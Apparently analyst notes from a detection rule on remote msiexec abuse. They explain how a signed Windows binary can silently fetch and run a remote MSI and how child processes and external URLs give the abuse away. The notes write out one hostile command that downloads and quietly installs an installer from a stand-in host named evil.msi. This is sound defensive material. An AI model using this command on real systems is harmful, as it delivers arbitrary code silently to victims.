    analyst_notes: msiexec remote installation (msiexec /q /i http://host/evil.msi) is a clean delivery mechanism because the Windows Installer service handles the download and execution under a Microsoft-signed binary. The /q (quiet) flag suppresses the installer UI, making it silent. Custom actions inside the MSI can run arbitrary code including shell commands, making the child-process detection the second-stage tell. Legitimate software deployment via SCCM/Intune uses msiexec but from managed shares and with known product codes, not from external HTTP URLs.
